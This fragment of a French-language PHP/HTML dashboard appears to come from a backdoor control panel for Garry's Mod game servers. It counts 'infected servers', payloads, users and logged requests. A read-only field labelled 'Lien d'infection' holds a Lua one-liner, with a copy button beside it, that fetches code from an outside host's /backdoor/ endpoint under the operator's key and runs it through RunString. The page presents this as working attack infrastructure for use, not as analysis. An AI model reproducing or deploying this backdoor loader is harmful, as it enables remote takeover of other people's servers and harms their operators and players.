              ...
              <div class="col-xl-3 col-sm-6 grid-margin stretch-card">
                <div class="card">
                  <div class="card-body">
                    <div class="row">
                      <div class="col-9">
                        <div class="d-flex align-items-center align-self-start">
                          <h3 class="mb-0"><?php $svowncn = Account::GetKey(); echo $GLOBALS['DB']->Count('server_list', ["server_owner" => $svowncn]); ?></h3>
                        </div>
                      </div>
                      <div class="col-3">
                    ...
                    <h6 class="text-muted font-weight-normal">Serveurs infectés (actif ou non)</h6>
                  </div>
                </div>
              </div>
              <div class="col-xl-3 col-sm-6 grid-margin stretch-card">
                <div class="card">
                  <div class="card-body">
                    <div class="row">
                      <div class="col-9">
                        <div class="d-flex align-items-center align-self-start">
                          <h3 class="mb-0"><?php echo $GLOBALS['DB']->Count('users'); ?></h3>
                        </div>
                      </div>
                      <div class="col-3">
                        <div class="icon icon-box-success ">
                ...
                <div class="card">
                  <div class="card-body">
                    <div class="row">
                      <div class="col-9">
                        <div class="d-flex align-items-center align-self-start">
                          <h3 class="mb-0"><?php echo $GLOBALS['DB']->Count('payload', ["payload_owner" => $svowncn]); ?></h3>
                        </div>
                      </div>
                      <div class="col-3">
                        <div class="icon icon-box-success ">
                    ...
                    <h6 class="text-muted font-weight-normal">Payloads</h6>
                  </div>
                </div>
              </div>
              <div class="col-xl-3 col-sm-6 grid-margin stretch-card">
                <div class="card">
                  <div class="card-body">
                    <div class="row">
                      <div class="col-9">
                        <div class="d-flex align-items-center align-self-start">
                          <h3 class="mb-0"><?php echo $GLOBALS['DB']->Count('logs'); ?></h3>
                        </div>
                      </div>
                      <div class="col-3">
                        <div class="icon icon-box-success ">
                    ...
                    <h6 class="text-muted font-weight-normal">Requetes</h6>
                  </div>
                </div>
              </div>
            </div>
                  ...
                  <div class="card-body">
                    ...
                    <div class="table-responsive">
                      <div class="form-group">
                        <label for="backdoor">Lien d'infection</label>
                        <input type="text" id="bd" class="form-control" style="transition: 0.5s; filter: blur(5px); background: transparent;" readonly value='timer.Simple(1, function() http.Fetch("https://kpanel.cz/backdoor/yay1.php?key=<?php echo Account::GetKey() ?>",function(b,l,h,c)RunString(b)end,nil) end)'>
                        <br><br>
                        <center>
                        <button onclick="copybackdoor()" class="btn btn-info">Copier</button>
                        <br><br>
                        <button onclick="reveal()" id="thebtn" class="btn btn-danger">Révéler le lien</button>
                        <button onclick="hide()" id="thebtn2" style="display: none;" class="btn btn-success">Cacher le lien</button>
                      </center>
                      </div>
                    </div>
                  </div>
...
function copybackdoor() {
  var backdoor = document.getElementById("bd");
  backdoor.select();
